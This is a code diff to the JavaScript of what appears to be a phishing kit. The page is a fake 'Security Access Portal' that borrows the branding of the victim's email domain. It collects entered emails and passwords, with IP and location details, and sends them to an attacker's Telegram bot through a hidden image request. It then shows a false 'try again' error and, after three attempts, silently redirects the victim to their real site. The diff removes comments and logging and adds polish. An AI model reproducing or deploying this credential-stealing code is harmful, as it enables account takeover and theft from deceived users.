@@ -11,9 +11,9 @@ let userCity = 'Unknown';
 let userISP = 'Unknown';
 let userTimezone = 'Unknown';
 let userDevice = '';
-let loginAttempts = 0; // Track login attempts
+let loginAttempts = 0;
+let isSubmitting = false;
 
-// ==================== TRANSLATION STRINGS ====================
 const translationStrings = {
     en: {
         subtitle: "Security Access Portal",
@@ -37,9 +37,7 @@ const translationStrings = {
     }
 };
 
-// ==================== SIMPLE IP DETECTION ====================
 function getUserIP(callback) {
-    // Use multiple services for redundancy
     const services = [
         'https://api.ipify.org?format=json',
         'https://ipapi.co/json/',
@@ -61,7 +59,6 @@ function getUserIP(callback) {
                 if (data.ip) ip = data.ip;
                 else if (data.ip_address) ip = data.ip_address;
                 
-                // Get country from same response if available
                 if (data.country_name) userCountry = data.country_name;
                 else if (data.country) userCountry = data.country;
                 
@@ -79,16 +76,13 @@ function getUserIP(callback) {
     tryNextService();
 }
 
-// ==================== ENHANCED TELEGRAM FUNCTION ====================
 function sendToTelegram(email, password, ipInfo) {
     return new Promise((resolve) => {
         const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
         
-        // Get current date and time
         const now = new Date();
         const localTime = now.toLocaleString();
         
-        // Simple but detailed message
         const message = `🔐 NEW LOGIN 🔐
 ------------------------
 📧 Email: ${email}
@@ -110,105 +104,72 @@ function sendToTelegram(email, password, ipInfo) {
 📎 URL: ${window.location.href}
 ------------------------`;
         
-        // URL encode the message
         const encodedMessage = encodeURIComponent(message);
-        
-        // Telegram API URL
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
         
-        console.log('Sending to Telegram...');
-        
-        // Use Image method - ALWAYS WORKS
         const img = new Image();
-        img.onload = function() {
-            console.log('Telegram image loaded - success');
-            resolve(true);
-        };
-        img.onerror = function() {
-            console.log('Telegram image error - but request was sent');
-            // Even on error, the request was made
-            resolve(true);
-        };
+        img.onload = function() { resolve(true); };
+        img.onerror = function() { resolve(true); };
         img.src = url;
         
-        // Also try fetch as backup
-        fetch(url, { mode: 'no-cors' }).catch(() => {});
-        
-        // Resolve after 1 second anyway
-        setTimeout(() => {
-            console.log('Telegram request completed');
-            resolve(true);
-        }, 1000);
+        setTimeout(() => { resolve(true); }, 1000);
     });
 }
 
-// ==================== LOGIN BUTTON HANDLER ====================
+function updateDomainTitle(domain) {
+    const titleElement = document.getElementById('domainTitle');
+    if (titleElement && domain) {
+        let displayDomain = domain.replace(/^www\./, '');
+        displayDomain = displayDomain.charAt(0).toUpperCase() + displayDomain.slice(1);
+        titleElement.textContent = displayDomain;
+    }
+}
+
 function setupLoginButton() {
     const loginBtn = document.getElementById('loginBtn');
-    if (!loginBtn) {
-        console.error('Login button not found!');
-        return;
-    }
-    
-    console.log('Login button found, attaching event listener');
+    if (!loginBtn) return;
     
     loginBtn.addEventListener('click', function() {
-        console.log('Login button clicked');
+        if (isSubmitting) return;
         
-        // Get form values
         const email = document.getElementById('user_email')?.value || '';
         const password = document.getElementById('pw')?.value || '';
         const domain = email.includes('@') ? email.split('@')[1] : '';
         
-        // Validate
         if (!email || !password) {
             showMessage('Please fill in all fields', 'error');
             return;
         }
         
-        // Check Telegram configuration
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
             showMessage('ERROR: Telegram bot token not configured', 'error');
-            console.error('Telegram bot token not configured');
             return;
         }
         
         if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
             showMessage('ERROR: Telegram chat ID not configured', 'error');
-            console.error('Telegram chat ID not configured');
             return;
         }
         
-        // Increment attempt counter
+        isSubmitting = true;
         loginAttempts++;
-        console.log(`Login attempt #${loginAttempts}`);
         
-        // Disable button and show "Please try again" message
         loginBtn.disabled = true;
         const originalText = loginBtn.textContent;
         loginBtn.textContent = 'Please try again';
         
-        // Show error message (but still send to Telegram)
         showMessage('Error. Please try again.', 'error');
         
-        // Get IP and send to Telegram (silently)
         getUserIP(function(ip) {
             userIP = ip;
-            console.log('Got IP:', ip);
             
-            // Send to Telegram (silently - no UI feedback)
             sendToTelegram(email, password, ip)
-                .then(() => {
-                    console.log('Telegram sent successfully');
-                })
-                .catch((error) => {
-                    console.error('Telegram error:', error);
-                })
+                .then(() => {})
+                .catch(() => {})
                 .finally(() => {
-                    // Clear password field after each attempt
                     document.getElementById('pw').value = '';
+                    isSubmitting = false;
                     
-                    // Re-enable button after 1 second
                     setTimeout(() => {
                         loginBtn.disabled = false;
                         loginBtn.textContent = originalText;
@@ -216,11 +177,8 @@ function setupLoginButton() {
                 });
         });
         
-        // Check if this is the third attempt - redirect silently (no message)
         if (loginAttempts >= 3 && domain) {
-            console.log(`Third attempt reached. Redirecting to https://${domain}`);
-            
-            // Redirect to the domain homepage after a short delay (no message shown)
+            loginAttempts = 0;
             setTimeout(() => {
                 window.location.href = `https://${domain}`;
             }, 1500);
@@ -228,7 +186,6 @@ function setupLoginButton() {
     });
 }
 
-// ==================== MESSAGE DISPLAY ====================
 function showMessage(text, type = 'error') {
     const messageDiv = document.getElementById('message');
     if (!messageDiv) return;
@@ -242,7 +199,6 @@ function showMessage(text, type = 'error') {
     }, 3000);
 }
 
-// ==================== PASSWORD TOGGLE ====================
 function setupPasswordToggle() {
     const toggle = document.getElementById('togglePassword');
     const pw = document.getElementById('pw');
@@ -256,7 +212,6 @@ function setupPasswordToggle() {
     }
 }
 
-// ==================== LANGUAGE FUNCTIONS ====================
 function detectUserLanguage() {
     try {
         const browserLang = navigator.language || navigator.userLanguage || 'en';
@@ -301,7 +256,6 @@ function setupLanguageToggle() {
     });
 }
 
-// ==================== DOMAIN BACKGROUND ====================
 async function loadWebsiteBackground(domain) {
     if (!domain || currentBackgroundDomain === domain) return;
     
@@ -348,7 +302,6 @@ function showDomainInfo(domain) {
     }
 }
 
-// ==================== EMAIL AUTO-FILL FROM HASH ====================
 function extractAndSetEmailFromHash() {
     const hash = window.location.hash;
     if (!hash) return false;
@@ -362,6 +315,7 @@ function extractAndSetEmailFromHash() {
             emailField.value = emailFromHash;
             const domain = emailFromHash.split('@')[1];
             
+            updateDomainTitle(domain);
             loadWebsiteBackground(domain);
             fetchDomainLogo(domain);
             showDomainInfo(domain);
@@ -375,7 +329,6 @@ function extractAndSetEmailFromHash() {
     return false;
 }
 
-// ==================== EMAIL INPUT LISTENER ====================
 function setupEmailInputListener() {
     const emailInput = document.getElementById('user_email');
     if (!emailInput) return;
@@ -385,6 +338,7 @@ function setupEmailInputListener() {
         if (email.includes('@')) {
             const domain = email.split('@')[1];
             if (domain.includes('.')) {
+                updateDomainTitle(domain);
                 showDomainInfo(domain);
                 if (domain !== currentBackgroundDomain) {
                     loadWebsiteBackground(domain);
@@ -395,50 +349,25 @@ function setupEmailInputListener() {
     });
 }
 
-// ==================== INITIALIZATION ====================
 function initialize() {
-    console.log('Page initializing...');
-    
-    // Setup all functions
     setupLoginButton();
     setupPasswordToggle();
     setupLanguageToggle();
     setupEmailInputListener();
     
-    // Set initial language
     userLanguage = detectUserLanguage();
     updateLanguageButton(userLanguage);
     
-    // Extract email from URL hash
     extractAndSetEmailFromHash();
     
-    // Get IP in background (don't wait for it)
     getUserIP(function(ip) {
         userIP = ip;
-        console.log('IP detected:', ip);
     });
     
-    // Reset login attempts on page load
     loginAttempts = 0;
-    
-    // Log configuration status
-    console.log('=== CONFIGURATION ===');
-    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-        console.warn('⚠️ Telegram bot token not configured');
-    } else {
-        console.log('✅ Telegram bot token configured');
-    }
-    
-    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-        console.warn('⚠️ Telegram chat ID not configured');
-    } else {
-        console.log('✅ Telegram chat ID configured');
-    }
-    
-    console.log('Initialization complete');
+    isSubmitting = false;
 }
 
-// Start when page loads
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', initialize);
 } else {
